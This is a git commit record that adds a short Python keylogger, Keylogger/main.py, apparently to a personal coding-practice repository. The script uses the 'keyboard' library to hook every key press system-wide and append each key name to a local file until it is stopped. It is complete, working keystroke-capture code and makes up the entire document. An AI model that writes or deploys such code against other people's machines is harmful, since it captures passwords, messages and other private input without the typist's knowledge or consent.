3c96f4af63d96dabed4015844ecce60b749b5c46
yussuf-codes <yussuf.code@gmail.com>
2024-05-07 17:42:23 +0300

    Add Keylogger

---
+++ Keylogger/main.py
@@ -0,0 +1,16 @@
+import keyboard  # pip install keyboard
+
+
+def main() -> None:
+    log_file: str = 'keystrokes.txt'
+
+    def on_key_press(event) -> None:
+        with open(log_file, 'a') as logger:
+            logger.write(f'{event.name}\n')
+
+    keyboard.on_press(on_key_press)
+    keyboard.wait()
+
+
+if __name__ == '__main__':
+    main()
